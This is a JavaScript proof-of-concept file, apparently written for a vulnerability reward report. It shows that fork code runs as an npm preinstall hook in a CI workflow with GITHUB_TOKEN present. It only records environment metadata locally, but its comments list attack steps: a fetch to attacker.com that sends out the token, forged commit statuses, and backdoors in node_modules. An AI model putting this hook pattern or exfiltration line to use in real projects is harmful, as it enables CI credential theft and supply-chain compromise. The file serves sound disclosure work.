/**
 * SECURITY RESEARCH — Proof of Concept
 * Demonstrates that fork code executes during `npm ci` in the chained_e2e workflow
 * with access to GITHUB_TOKEN (statuses:write permission).
 *
 * This script runs as a preinstall hook — triggered automatically when
 * `npm ci` processes the fork's package.json. No user interaction required.
 *
 * Contact: amhurtado@pm.me
 * VRP: GEMINI-CLI-ARTIFACT-001
 */

import { writeFileSync, mkdirSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const evidenceDir = join(__dirname, '..', '.poc-evidence');

try { mkdirSync(evidenceDir, { recursive: true }); } catch {}

const evidence = {
  timestamp: new Date().toISOString(),
  phase: 'npm-ci-preinstall',
  description: 'Fork code executing during npm ci via preinstall hook',
  runner: {
    name: process.env.RUNNER_NAME || 'unknown',
    os: process.env.RUNNER_OS || 'unknown',
    workspace: process.env.GITHUB_WORKSPACE || 'unknown',
  },
  workflow: {
    name: process.env.GITHUB_WORKFLOW || 'unknown',
    run_id: process.env.GITHUB_RUN_ID || 'unknown',
    repository: process.env.GITHUB_REPOSITORY || 'unknown',
    event_name: process.env.GITHUB_EVENT_NAME || 'unknown',
    actor: process.env.GITHUB_ACTOR || 'unknown',
    triggering_actor: process.env.GITHUB_TRIGGERING_ACTOR || 'unknown',
  },
  tokens: {
    GITHUB_TOKEN_present: 'GITHUB_TOKEN' in process.env,
    GITHUB_TOKEN_length: process.env.GITHUB_TOKEN?.length || 0,
    // GITHUB_TOKEN permissions are set in workflow YAML:
    //   contents: read, statuses: write
    // An attacker would use this to POST /repos/{owner}/{repo}/statuses/{sha}
    // setting any commit's CI status to "success" — merge queue manipulation.
    GEMINI_API_KEY_present: 'GEMINI_API_KEY' in process.env,
    // API key is NOT available during npm ci (step-level env on test step only).
    // This proves the preinstall hook runs BEFORE secrets are injected.
  },
  // What an attacker would do here:
  attack_vectors: [
    'Exfiltrate GITHUB_TOKEN via fetch("https://attacker.com/?t=" + process.env.GITHUB_TOKEN)',
    'Set commit status to success: POST /repos/google-gemini/gemini-cli/statuses/{sha} with GITHUB_TOKEN',
    'Install persistent backdoor in node_modules/ that activates during test step (which has GEMINI_API_KEY)',
    'Modify build output to inject exfiltration code that runs when GEMINI_API_KEY is in scope',
  ],
};

const evidencePath = join(evidenceDir, 'preinstall-evidence.json');
writeFileSync(evidencePath, JSON.stringify(evidence, null, 2));

console.log('\n' + '='.repeat(72));
console.log('  SECURITY RESEARCH PoC — GEMINI-CLI-ARTIFACT-001');
console.log('  Phase: npm ci preinstall hook (fork code execution)');
console.log('='.repeat(72));
console.log(`  Runner:         ${evidence.runner.name}`);
console.log(`  Workflow:       ${evidence.workflow.name}`);
console.log(`  Run ID:         ${evidence.workflow.run_id}`);
console.log(`  Event:          ${evidence.workflow.event_name}`);
console.log(`  GITHUB_TOKEN:   ${evidence.tokens.GITHUB_TOKEN_present ? 'PRESENT (' + evidence.tokens.GITHUB_TOKEN_length + ' chars)' : 'ABSENT'}`);
console.log(`  GEMINI_API_KEY: ${evidence.tokens.GEMINI_API_KEY_present ? 'PRESENT' : 'ABSENT (expected — step-level env)'}`);
console.log(`  Evidence saved: ${evidencePath}`);
console.log('='.repeat(72) + '\n');
